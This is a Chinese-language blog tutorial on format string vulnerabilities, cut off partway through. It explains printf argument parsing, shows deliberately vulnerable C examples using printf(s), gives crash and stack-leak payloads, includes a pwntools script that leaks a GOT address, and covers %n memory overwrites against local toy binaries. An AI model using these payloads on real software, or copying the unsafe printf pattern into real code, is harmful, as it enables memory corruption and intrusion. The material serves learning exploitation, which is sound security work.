@@ -1,0 +1,746 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="b1ackie">
+  <meta name="keywords" content="">
+  <meta name="description" content="格式化字符串原理介绍格式化字符串函数可以接收可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为可读的字符串格式。几乎所有的C&#x2F;C++程序都会利用格式化字符串函数来输出信息、调试程序、或者处理字符串。一般来说，格式化字符串在利用的时候主要为三个部分：  格式化字符串函数 格式化字符串 后续参数，可选  格式化字符串函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="b1ackie&#39;blog">
+<meta property="og:description" content="格式化字符串原理介绍格式化字符串函数可以接收可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为可读的字符串格式。几乎所有的C&#x2F;C++程序都会利用格式化字符串函数来输出信息、调试程序、或者处理字符串。一般来说，格式化字符串在利用的时候主要为三个部分：  格式化字符串函数 格式化字符串 后续参数，可选  格式化字符串函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/12.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/13.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/14.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/15.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/16.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/17.png">
+<meta property="og:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/18.png">
+<meta property="article:published_time" content="2022-01-06T09:35:24.000Z">
+<meta property="article:modified_time" content="2022-01-11T06:45:39.713Z">
+<meta property="article:author" content="b1ackie">
+<meta property="article:tag" content="格式化字符串">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png">
+  
+  <title>格式化字符串漏洞 - b1ackie&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/vs2015.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"b1ackie.cn","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="b1ackie'blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>b1ackie&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post%E8%83%8C%E6%99%AF%E5%9B%BE.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="格式化字符串漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-06 17:35" pubdate>
+        2022-01-06 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">格式化字符串漏洞</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2022-01-11 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>格式化字符串函数可以接收可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来输出信息、调试程序、或者处理字符串。一般来说，格式化字符串在利用的时候主要为三个部分：</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数，可选</li>
+</ul>
+<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><p>scanf</p>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>基本介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>printf</td>
+<td>输出到stdout</td>
+</tr>
+<tr>
+<td>fprintf</td>
+<td>输出到指定FILE流</td>
+</tr>
+<tr>
+<td>vprintf</td>
+<td>根据参数列表格式化输出到stdout</td>
+</tr>
+<tr>
+<td>vfprintf</td>
+<td>根据参数列表格式化输出到指定的FILE流</td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td>输出到字符串</td>
+</tr>
+<tr>
+<td>snprintf</td>
+<td>输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td>vsprintf</td>
+<td>根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td>vsnprintf</td>
+<td>根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>setproctitle</td>
+<td>设置argv</td>
+</tr>
+<tr>
+<td>syslog</td>
+<td>输出日志</td>
+</tr>
+</tbody></table>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>首先来看一下关于<code>printf</code>函数，比如说如下语句</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;color  %s, number %d, float %4.2f&quot;</span>, <span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-number">123456</span>, <span class="hljs-number">3.14</span>);<br></code></pre></div></td></tr></table></figure>
+
+<p>当执行到printf前的栈情况是这样的，为了看起来更方便，用gdb调试查看。可以看到当前的栈情况，首先是<code>color  %s, number %d, float %4.2f</code>，然后是三个参数。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>在进入<code>printf</code>之前，函数会首先获取第一个参数，一个一个读取字符会遇到两种情况。</p>
+<ul>
+<li>当前字符不是%，直接输出到相应标准输出。</li>
+<li>当前字符是%，继续读取下一个字符，会有三种情况。</li>
+</ul>
+<ol>
+<li>如果没有字符，报错；</li>
+<li>如果下一个字符是%，输出%；</li>
+<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出。</li>
+</ol>
+<p>假设前面的程序，语句修改成如下</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;color  %s, number %d, float %4.2f&quot;</span>);<br></code></pre></div></td></tr></table></figure>
+
+<p>此时，对于这个函数并没有提供参数，程序就会将栈上的三个变量分别解析为</p>
+<ol>
+<li>解析其地址对应的字符串</li>
+<li>解析其内容对应的整型值</li>
+<li>解析其内容对应的浮点数</li>
+</ol>
+<p>后面两个还好一点，但是对于第一个<code>%s</code>来说，如果提供了一个不可以访问的地址，那么程序就会崩溃，这就是格式化字符串漏洞的基本原理。</p>
+<h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>对于格式化字符串的漏洞利用主要是两个利用手段</p>
+<ul>
+<li>是程序崩溃，因为<code>%s</code>对应的参数地址不合法的概率较大。</li>
+<li>查看进程内容，根据<code>%d</code>，<code>%f</code>输出了栈上的内容。</li>
+</ul>
+<h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>对于程序崩溃来说，一般情况下这是最简单的利用方式，只需要连续输入若干个<code>%s</code>即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></div></td></tr></table></figure>
+
+<p>具体的原理，在前面已经介绍过了。</p>
+<h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><p>利用格式化字符串的漏洞，我们可以获取我们想要的输出的内容，一般有如下操作：</p>
+<ul>
+<li>泄露栈内存<ul>
+<li>获取某个变量的值</li>
+<li>获取某个变量对应地址的内存</li>
+</ul>
+</li>
+<li>泄露任意地址内存<ul>
+<li>利用GOT表得到libc函数地址，进而获取libc，也可以获取其他libc函数地址</li>
+<li>盲打，dump整个程序，获取有用信息</li>
+</ul>
+</li>
+</ul>
+<h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>如下的程序</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先是可以利用格式化字符串来获取栈上的变量的数值。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到打印出来三个十六进制值，可以通过调试进一步查看。</p>
+<p>可以看到输入<code>%08x.%08x.%08x</code>，打印出来三个栈上的值</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>如上的方法，是依次获得栈中的每个参数，也可以通过如下方法，获得指定的参数的值。</p>
+<figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos"><span class="hljs-built_in">%n</span><span class="hljs-built_in">$x</span><br></code></pre></div></td></tr></table></figure>
+
+<p>比如还是刚才的程序，输入<code>%3$x</code>，查看结果，看到输出了第三个参数的值，也就是栈上的第四个值。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>还可以获得栈变量对应的字符串，只需要输入<code>%s</code>就可以了。</p>
+<p>还是这个程序，输入<code>%s</code>查看结果。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>刚才尝试了泄露栈上的连续变量，指定的变量，但还时没有能完全控制我们所要泄露的变量的地址。有时，可能需要泄露某一个<code>libc</code>函数的<code>got</code>表内容，从而得到其地址，进而获取<code>libc</code>版本以及其他函数的地址。</p>
+<p>如果我们想要控制格式化字符串，我们就要知道该格式化字符串在输出函数调用的时候，用的是第几个参数，假设此时对应的是第n个参数，那么就可以通过如下方式获得某个指定地址addr的内容</p>
+<p><code>addr%n$s</code></p>
+<p>如何确定是第几个参数，就可以通过输入一长列%p来确定<code>[tag]%p%p%p%p%p%p...</code>。</p>
+<p>还是拿之前的程序来做例子，输入<code>aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code></p>
+<p>从图中可以看出，第四个位置是61616161，也就是我们输入的aaaa的ASCII码，那么现在可以确定是第四个参数。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在尝试获取以下<code>scanf</code>函数的地址，使用<code>pwntools</code>来构造<code>payload</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./2&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./2&quot;</span>)<br>scanf = elf.got[<span class="hljs-string">&quot;__isoc99_scanf&quot;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(scanf)<br>payload = p32(scanf) + <span class="hljs-string">&quot;%4$s&quot;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;%4$s\n&quot;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>sh.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<p>看到已经成功打印出了<code>scanf</code>函数的地址</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>刚才是通过格式化字符串来泄露栈内存以及任意地址的内存，现在来尝试修改任意地址变量的内存，只要变量对应的地址可写，就可以利用格式化字符串来修改其对应的数值。</p>
+<p><code>%n</code>是不输出字符，但是会把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<p>示例程序</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>一般需要构造的payload如下</p>
+<figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">...<span class="hljs-selector-attr">[overwrite addr]</span>....%<span class="hljs-selector-attr">[overwrite offset]</span><span class="hljs-variable">$n</span><br></code></pre></div></td></tr></table></figure>
+
+<p>在这其中，<code>...</code>表示需要填充的内容，<code>overwrite addr</code> 是需要覆盖的地址，<code>overwrite offset</code>表示需要覆盖的地址存储位置是输出函数格式化字符串的第几个参数。由此确定几个步骤：</p>
+<ul>
+<li>确定覆盖地址</li>
+<li>确定相对偏移</li>
+<li>进行覆盖</li>
+</ul>
+<h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先是要确定覆盖的地址，在这个程序中，就是需要知道变量C的地址，这个示例作为学习，就在代码中直接输出了变量C的地址，比较简单。</p>
+<h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>通过调试确定输入的格式化字符串是第几个参数。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>调试之后，可以看到，格式化字符串是第六个参数。</p>
+<h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>现在已经知道了要覆盖的地址，还有覆盖的是第几个参数，现在就可以来尝试进行覆盖了。构造的payload如下，首先是变量C的存储地址，程序会打印，只需要接收即可，然后是<code>%012d</code>，刚才知道<code>%n</code>会把成功输出的字符个数写入，所以地址是四个字节，现在还需要十二个，就是十六。然后是<code>%6$n</code>，刚才分析过，是第六个参数。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *    <br>sh = process(<span class="hljs-string">&#x27;./3&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span 